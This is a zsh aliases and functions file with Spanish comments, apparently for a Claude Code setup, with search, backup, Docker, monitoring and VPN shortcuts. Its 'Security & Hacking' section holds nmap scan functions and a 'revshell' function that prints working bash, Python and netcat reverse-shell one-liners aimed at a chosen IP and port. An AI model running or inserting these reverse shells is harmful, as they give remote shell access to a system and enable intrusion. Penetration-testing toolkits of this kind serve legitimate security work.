# Claude Code - Aliases y Funciones
# Agrega a tu ~/.zshrc: source ~/.config/claude/aliases.zsh

# ============================================
# Claude Code Shortcuts
# ============================================

# Búsqueda rápida en SearXNG
alias s='searxng-search'
alias websearch='searxng-search'

# Búsquedas específicas por motor
sx() {
    # Búsqueda con motor específico
    # Uso: sx ddg "query" | sx go "query" | sx gh "query"
    local engine="$1"
    shift
    searxng-search "!${engine} $*"
}

# Búsquedas temáticas rápidas
alias cve='sx exploit-db'       # Buscar CVEs/exploits
alias ghsearch='sx gh'          # Buscar en GitHub
alias so='sx so'                # Stack Overflow
alias aw='sx aw'                # Arch Wiki

# Claude backups (ahora usa git)
alias cb='claude-backup'
alias csync='claude-backup sync'
alias cbackup='claude-backup backup'
alias crestore='claude-backup restore'

# SearXNG management
alias searxng-start='systemctl --user start searxng.service'
alias searxng-stop='systemctl --user stop searxng.service'
alias searxng-restart='systemctl --user restart searxng.service'
alias searxng-status='systemctl --user status searxng.service'
alias searxng-logs='docker logs -f searxng'

# ============================================
# Funciones Avanzadas
# ============================================

# Búsqueda con preview en fzf
searchfzf() {
    local query="$*"
    searxng-search "$query" json | \
        jq -r '.results[] | "\(.title)\t\(.url)"' | \
        fzf --preview 'echo {}' --preview-window=up:3:wrap | \
        cut -f2 | \
        xargs -r xdg-open
}

# Búsqueda rápida de documentación
cdocs() {
    local tech="$1"
    shift
    searxng-search "!ddg $tech documentation $*" | \
        jq -r '.results[0].url' | \
        xargs -r xdg-open
}

# Búsqueda de vulnerabilidades
vuln() {
    local software="$*"
    searxng-search "!exploit-db $software"
}

# Quick web search y open
o() {
    # Open first result
    searxng-search "$*" json | \
        jq -r '.results[0].url' | \
        xargs -r xdg-open
}

# ============================================
# MCP Helper Functions
# ============================================

# Quick note para Claude Code
cnote() {
    local note="$*"
    echo "$note" >> ~/.config/claude/notes.txt
    echo "✓ Nota agregada"
}

# Ver notas
cnotes() {
    cat ~/.config/claude/notes.txt 2>/dev/null || echo "No hay notas"
}

# ============================================
# Security & Hacking Shortcuts
# ============================================

# Nmap quick scan
nq() {
    sudo nmap -sV -sC "$1"
}

# Quick full port scan
portscan() {
    sudo nmap -p- --min-rate=1000 -T4 "$1"
}

# Reverse shell generator (ethical use only)
revshell() {
    local ip="${1:-127.0.0.1}"
    local port="${2:-4444}"
    echo "Bash: bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo "NC: nc -e /bin/sh $ip $port"
}

# ============================================
# Backend Dev Shortcuts
# ============================================

# Docker quick commands (solo los que no tienes)
alias d='docker'
alias dlog='docker logs -f'
alias dex='docker exec -it'

# Quick servers
alias serve='python -m http.server'
alias serve8000='python -m http.server 8000'

# JSON pretty print
alias json='jq .'

# Quick base64 encode/decode
alias b64='base64'
alias b64d='base64 -d'

# ============================================
# System Monitoring
# ============================================

# Quick system stats
alias cpu='ps aux | sort -nr -k 3 | head -10'
alias mem='ps aux | sort -nr -k 4 | head -10'
alias ports-listening='sudo netstat -tulpn | grep LISTEN'

# ============================================
# Proton Services
# ============================================

# ProtonVPN quick connect (ya tienes 'vpn' definido, estos son complementos)
alias vpnc='protonvpn connect'
alias vpnd='protonvpn disconnect'
alias vpni='protonvpn info'
